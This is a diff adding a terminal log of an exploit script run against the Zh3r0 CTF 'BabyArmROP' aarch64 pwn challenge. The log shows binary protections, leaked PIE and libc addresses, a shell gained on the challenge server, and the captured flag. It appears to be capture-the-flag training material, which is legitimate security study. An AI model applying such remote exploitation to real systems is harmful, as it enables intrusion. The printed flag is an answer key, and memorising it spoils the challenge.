@@ -1,0 +1,31 @@
+mito@ubuntu:~/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln$ python3 solve.py r
+[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/vuln'
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to pwn.zh3r0.cf on port 1111: Done
+[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/lib/libc.so.6'
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+pie_leak = 0x6008f8a8
+pie_base = 0x6008f000
+read_addr   = 0xd4550f0
+libc_base   = 0xd393000
+system_addr = 0xd3d2218
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ cd /vuln
+$ ls -l
+total 2084
+-rw-rw-rw- 1 root root      44 Jun  3 20:50 flag
+drwxrwxrwx 2 root root    4096 Jun  3 20:50 lib
+-rwxrwxrwx 1 root root 2113112 Jun  3 20:50 qemu-aarch64
+-rwxrwxrwx 1 root root    9528 Jun  3 20:50 vuln
+$ cat flag
+zh3r0{b4by_aaarch64_r0p_f04_fun_4nd_pr0fit}
